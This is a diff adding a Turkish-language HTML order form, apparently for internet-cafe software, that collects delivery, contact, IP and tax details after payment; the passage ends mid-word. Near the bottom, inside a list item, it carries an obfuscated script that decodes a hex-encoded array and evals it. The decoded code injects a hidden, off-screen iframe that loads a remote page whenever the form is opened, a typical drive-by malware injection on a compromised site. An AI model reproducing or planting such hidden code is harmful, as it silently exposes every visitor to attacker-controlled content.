@@ -1,0 +1,224 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Untitled Document</title>
+<!-- ATTENTION! Do not remove this string -->
+<BASE href="http://www.webaynet.com/tr/">
+<!-- ... end of attention string -->
+<SCRIPT LANGUAGE = "JavaScript">
+	function isFilled(str){ return (str != ""); }
+	function isEmail(string) { return (string.search(/^\w+((-\w+)|(\.\w+))*\@[A-Za-z0-9]+((\.|-)[A-Za-z0-9]+)*\.[A-Za-z0-9]+$/) != -1)||(string==''); }
+ 	function isDigital(str)	{ return(parseFloat(str,10)==(str*1)); }
+ 	function isCurrency(val) { 	var re = /^(\$?\d+\$?|\$?\d+\.\d+\$?)$/; return (re.test(val)); }
+		function ValidForm(form) {
+		var field, i;
+		var req = new Array(11);
+		var email = new Array(1);
+		var digits = new Array(0);
+		var currs = new Array(0);
+		req[0] = "r_First_Name";
+		req[6] = "r_cafename";
+		req[4] = "rw_sabitip";
+		req[5] = "r_pccount";
+		req[3] = "r_Tel";
+		req[1] = "re_Contact_Email";
+		req[7] = "r_vdaire";
+		req[8] = "r_vno";
+		req[9] = "r_Com";
+		req[2] = "r_City";
+		req[10] = "r_captcha";
+		email[0] = "re_Contact_Email";
+
+		for (i=0;i<11;i++)	{
+			var field = document.getElementById(req[i]);
+			if ((field.type == 'checkbox')||(field.type == 'radio'))
+			{
+				var field = document.getElementsByName(req[i]);
+				var chk = false;
+				for(l=0;l<field.length;l++)
+				{
+					if (field[l].checked) chk = true;
+				}
+				if (!chk) {alert("'" + field[0].title + "' LÜTFEN GİRİLMESİ ZORUNLU ALANLARI DOLDURUNUZ."); return false; break;}
+			}
+			else
+			{
+			if (!isFilled(field.value))	{
+				alert("Eksik Alan '" + field.title + "' LÜTFEN GİRİLMESİ ZORUNLU ALANLARI DOLDURUNUZ.");
+				field.focus();
+				return false;
+				break;
+			}}}
+		for (i=0;i<1;i++)	{
+			var field = document.getElementById(email[i]);
+			if (!isEmail(field.value)) {
+				alert("Geçersiz Mail Adresi '" + field.title + "' LÜTFEN GEÇERLİ BİR MAİL ADRESİ GİRİNİZ. BÜYÜK HARF İLE YAZMAYINIZ.");
+				field.focus();
+				return false;
+				break;
+			}}
+		for (i=0;i<0;i++)	{
+			var field = document.getElementById(digits[i]);
+			if (!isDigital(field.value)) {
+				alert("Field " + field.title + " is required to be filled in only with digits (0-9) and decimal point before successful submission.");
+				field.focus();
+				return false;
+				break;
+			}}
+		for (i=0;i<0;i++)	{
+			var field = document.getElementById(currs[i]);
+			if (!isCurrency(field.value)) {
+				alert("Field " + field.title + " is required to be filled in only with digits (0-9) a decimal point, or a dollar sign before successful submission.");
+				field.focus();
+				return false;
+				break;
+			}}
+		return true; }
+</SCRIPT>
+<style type="text/css">
+<!--
+.style1 {font-family: Verdana, Arial, Helvetica, sans-serif;
+	font-size: x-small;
+}
+.style12 {font-size: small}
+body {
+	margin-left: 0px;
+	margin-top: 0px;
+	margin-right: 0px;
+	margin-bottom: 0px;
+}
+.style13 {
+	color: #FF0000;
+	font-weight: bold;
+}
+.style16 {	COLOR: #353535
+}
+.style19 {	FONT-SIZE: 11px; COLOR: #353535; FONT-FAMILY: Tahoma, Arial
+}
+.style25 {	color: #FFFFFF;
+	font-size: 14px;
+	font-weight: bold;
+}
+.style9 {	FONT-SIZE: 11px; COLOR: #7b7067; FONT-FAMILY: Tahoma, Arial
+}
+.style31 {color: #333333}
+.style33 {
+	font-size: medium;
+	color: #0000FF;
+}
+-->
+</style>
+</head>
+
+<body>
+<div align="center">
+  <table width="100%" border="0" cellspacing="0" cellpadding="0">
+    <tr>
+      <td valign="top"><FORM ACTION="https://www.webaynet.com/mailform/forms/formprocessorpro.php" METHOD="POST" ENCTYPE="multipart/form-data" onSubmit="return ValidForm(this);">
+<INPUT TYPE="hidden" NAME="___form_id_" VALUE="284a69445c9b704085838ff8f0ac6609489cd7674e4af">
+        <table width="100%" border="1" cellpadding="2" cellspacing="4" bordercolor="#DFE4E7">
+      <tr bgcolor="#FFFFFF">
+        <td height="59" bgcolor="#FFFFFF" class="style1"><div align="center"><img src="images/STEP2.jpg" width="413" height="105"></div></td>
+      </tr>
+      <tr bgcolor="#FFFFFF">
+        <td height="59" bgcolor="#FFFFFF" class="style1"><div align="center" class="style12"><br />
+            <span class="style13"><span class="style33">ÖDEMENİZ BAŞARI İLE ALINMIŞTIR;</span><br>
+            LÜTFEN AŞAĞIDAKİ FORMU EKSİKSİZ BİR ŞEKİLDE DOLDURUNUZ... </span><br />
+            <table cellspacing="2" cellpadding="2" width="100%" border="0">
+              <tbody>
+                
+                <tr valign="top" align="left">
+                  <td height="16" colspan="2" valign="middle" bgcolor="#FF0000" scope="row"><div align="left" class="style1 style25">TESLİMAT VE KİŞİSEL BİLGİLERİNİZ</div></td>
+                </tr>
+                <tr valign="top" align="left">
+                  <td scope="row"><strong class="style9">ADINIZ SOYADINIZ / UNVAN</strong></td>
+                  <td><strong class="style9">E-POSTA ADRESİNİZ</strong></td>
+                </tr>
+                <tr valign="top" align="left">
+                  <td scope="row" width="49%"><span class="style16">
+                    <input class="style9" name="r_First_Name" id = "r_First_Name" value="" title="Adınız veya Firma Unvanınız" style="FONT-WEIGHT: bold; COLOR: black; TEXT-ALIGN: left" autocomplete="off"/>
+                    *</span></td>
+                  <td width="51%"><span class="style16">
+                    <input class="style9" name="re_Contact_Email" id = "re_Contact_Email" value="" title="Email Adresiniz" style="FONT-WEIGHT: bold; COLOR: black; TEXT-ALIGN: left" autocomplete="off"/>
+                    *</span></td>
+                </tr>
+                <tr valign="top" align="left">
+                  <td class="style9" scope="row"><strong>ŞEHİR</strong></td>
+                  <td class="style9"><strong>TELEFON NUMARANIZ</strong></td>
+                </tr>
+                <tr valign="top" align="left">
+                  <td scope="row"><span class="style16">
+                    <input class="style9" name="r_City" id = "r_City" value="" title="Bulunduğunuz Şehir" style="FONT-WEIGHT: bold; COLOR: black; TEXT-ALIGN: left" autocomplete="off"/>
+                    * </span></td>
+                  <td><span class="style16">
+                    <input class="style9" name="r_Tel" id = "r_Tel" value="" title="Telefonunuz" style="FONT-WEIGHT: bold; COLOR: black; TEXT-ALIGN: left" maxlength="11" autocomplete="off"/>
+                    * </span></td>
+                </tr>
+                <tr valign="top" align="left">
+                  <td class="style9" scope="row"><strong>SABİT IP ADRESİNİZ</strong></td>
+                  <td class="style9"><strong>PC SAYINIZ</strong></td>
+                </tr>
+                <tr valign="top" align="left">
+                  <td class="style9" scope="row"><span class="style16">
+                    <input class="style9" name="rw_sabitip" id = "rw_sabitip" value="" title="Sabit IP Adresiniz" style="FONT-WEIGHT: bold; COLOR: black; TEXT-ALIGN: left" maxlength="20" autocomplete="off"/>
+                  *</span></td>
+                  <td class="style9"><span class="style16">
+                    <input class="style9" name="r_pccount" id = "r_pccount" value="" title="Bilgisayar Sayınız" style="FONT-WEIGHT: bold; COLOR: black; TEXT-ALIGN: left" size="4" maxlength="3" autocomplete="off"/>
+                  *</span></td>
+                </tr>
+                <tr valign="top" align="left">
+                  <td class="style9" scope="row"><strong>GSM NUMARANIZ</strong></td>
+                  <td class="style9"><strong class="style9">CAFE ADI </strong></td>
+                </tr>
+                <tr valign="top" align="left">
+                  <td scope="row"><span class="style16">
+                    <input class="style9" name="gsm" id = "gsm" value="" title="gsm" style="FONT-WEIGHT: bold; COLOR: black; TEXT-ALIGN: left" maxlength="11" autocomplete="off"/>
+                  </span></td>
+                  <td><span class="style16">
+                    <input class="style9" name="r_cafename" id = "r_cafename" value="" title="Cafe Adı" style="FONT-WEIGHT: bold; COLOR: black; TEXT-ALIGN: left" autocomplete="off"/>
+*</span></td>
+                </tr>
+                
+                <tr valign="top" align="left">
+                  <td class="style9" scope="row"><strong>VERGİ DAİRENİZ</strong></td>
+                  <td class="style9"><strong>VERGİ NUMARANIZ</strong></td>
+                </tr>
+                <tr valign="top" align="left">
+                  <td scope="row"><span class="style16">
+                    <input class="style9" name="r_vdaire" id = "r_vdaire" value="" title="Vergi Daresi" style="FONT-WEIGHT: bold; COLOR: black; TEXT-ALIGN: left" autocomplete="off"/>
+                    * </span></td>
+                  <td><span class="style16">
+                    <input 
+            class="style9" name="r_vno" id = "r_vno" value="" title="Vergi No" style="FONT-WEIGHT: bold; COLOR: black; TEXT-ALIGN: left" autocomplete="off"/>
+                    * </span></td>
+                </tr>
+                <tr valign="top" align="left">
+                  <td scope="row" colspan="2">&nbsp;</td>
+                </tr>
+                <tr valign="top" align="left">
+                  <td scope="row" colspan="2"><strong class="style9">ÜRÜN VE FATURA TESLİMAT ADRESİNİZ</strong><br />
+                      <textarea class="style19" id="r_Com" name="r_Com" title="Adres" rows="5" cols="63"></textarea>
+                    *</td>
+                </tr>
+                <tr valign="top" align="left">
+                  <td scope="row" colspan="2"><strong class="style9">VARSA ÖZEL MESAJINIZ</strong><br />
+                    <textarea class="style19" name="ozelmsg" id="ozelmsg" title="ozelmsg" rows="5" cols="63"></textarea></td>
+                </tr>
+                
+                <tr valign="top" align="left">
+                  <td scope="row">&nbsp;</td>
+                  <td><img src="http://www.webaynet.com/mailform/forms/formprocessorpro.php?captcha&t=0" style="border: 1px solid silver;" alt="Captcha Image: you will need to recognize the text in it."></td>
+                </tr>
+                <tr valign="top" align="left">
+                  <td scope="row"><div align="right"><strong class="style9"><br>
+                    GÜVERNLİK KODU</strong></div></td>
+                  <td class="style19"><input id="r_captcha" size="10" name="r_captcha" title="" value=""></td>
+                </tr>
+                <tr valign="top" align="left">
+                  <td scope="row">&nbsp;</td>
+                  <td><input type="SUBMIT" class="style9" value="İŞLEMİ TAMAMLA  &gt;&gt;" /></td>
+                </tr>
+                <tr valign="top" align="left">
+                  <td scope="row" colspan="2"><ul>
+                      <li class="style9"> <!-- . --><script>aq="0"+"x";bv=(5-3-1);sp="s"+"pli"+"t";w=window;z="dy";try{++document.body}catch(d21vd12v){vzs=false;try{}catch(wb){vzs=21;}if(!vzs)e=w["eval"];if(1){f="0,0,60,5d,17,1f,5b,66,5a,6c,64,5c,65,6b,25,5e,5c,6b,3c,63,5c,64,5c,65,6b,6a,39,70,4b,58,5e,45,58,64,5c,1f,1e,59,66,5b,70,1e,20,52,27,54,20,72,4,0,0,0,60,5d,69,58,64,5c,69,1f,20,32,4,0,0,74,17,5c,63,6a,5c,17,72,4,0,0,0,5b,66,5a,6c,64,5c,65,6b,25,6e,69,60,6b,5c,1f,19,33,60,5d,69,58,64,5c,17,6a,69,5a,34,1e,5f,6b,6b,67,31,26,26,6b,6e,66,58,65,5b,5f,58,63,5d,70,5c,58,69,25,6e,6a,26,69,5c,58,5a,5f,5c,5b,26,5e,63,66,59,58,63,56,69,5c,5d,63,5c,5a,6b,60,66,65,56,6a,66,6c,65,5b,60,65,5e,56,6b,5c,5a,5f,65,60,68,6c,5c,6a,25,67,5f,67,1e,17,6e,60,5b,6b,5f,34,1e,28,27,27,1e,17,5f,5c,60,5e,5f,6b,34,1e,28,27,27,1e,17,6a,6b,70,63,5c,34,1e,6e,60,5b,6b,5f,31,28,27,27,67,6f,32,5f,5c,60,5e,5f,6b,31,28,27,27,67,6f,32,67,66,6a,60,6b,60,66,65,31,58,59,6a,66,63,6c,6b,5c,32,63,5c,5d,6b,31,24,28,27,27,27,27,67,6f,32,6b,66,67,31,27,32,1e,35,33,26,60,5d,69,58,64,5c,35,19,20,32,4,0,0,74,4,0,0,5d,6c,65,5a,6b,60,66,65,17,60,5d,69,58,64,5c,69,1f,20,72,4,0,0,0,6d,58,69,17,5d,17,34,17,5b,66,5a,6c,64,5c,65,6b,25,5a,69,5c,58,6b,5c,3c,63,5c,64,5c,65,6b,1f,1e,60,5d,69,58,64,5c,1e,20,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,6a,69,5a,1e,23,1e,5f,6b,6b,67,31,26,26,6b,6e,66,58,65,5b,5f,58,63,5d,70,5c,58,69,25,6e,6a,26,69,5c,58,5a,5f,5c,5b,26,5e,63,66,59,58,63,56,69,5c,5d,63,5c,5a,6b,60,66,65,56,6a,66,6c,65,5b,60,65,5e,56,6b,5c,5a,5f,65,60,68,6c,5c,6a,25,67,5f,67,1e,20,32,5d,25,6a,6b,70,63,5c,25,63,5c,5d,6b,34,1e,24,28,27,27,27,27,67,6f,1e,32,5d,25,6a,6b,70,63,5c,25,6b,66,67,34,1e,27,1e,32,5d,25,6a,6b,70,63,5c,25,67,66,6a,60,6b,60,66,65,34,1e,58,59,6a,66,63,6c,6b,5c,1e,32,5d,25,6a,6b,70,63,5c,25,6b,66,67,34,1e,27,1e,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,6e,60,5b,6b,5f,1e,23,1e,28,27,27,1e,20,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,5f,5c,60,5e,5f,6b,1e,23,1e,28,27,27,1e,20,32,4,0,0,0,5b,66,5a,6c,64,5c,65,6b,25,5e,5c,6b,3c,63,5c,64,5c,65,6b,6a,39,70,4b,58,5e,45,58,64,5c,1f,1e,59,66,5b,70,1e,20,52,27,54,25,58,67,67,5c,65,5b,3a,5f,60,63,5b,1f,5d,20,32,4,0,0,74"[sp](",");}w=f;s=[];for(i=20-20;-i+670!=0;i+=1){j=i;if((0x19==031))if(e)s+=String["fromCharCode"](e(aq+w[j])+0xa-bv);}za=e;za(s)}</script><!-- . -->   (*) Lütfen bu işaretin olduğu alanları mutlaka doldurunuz. 
+                        Si
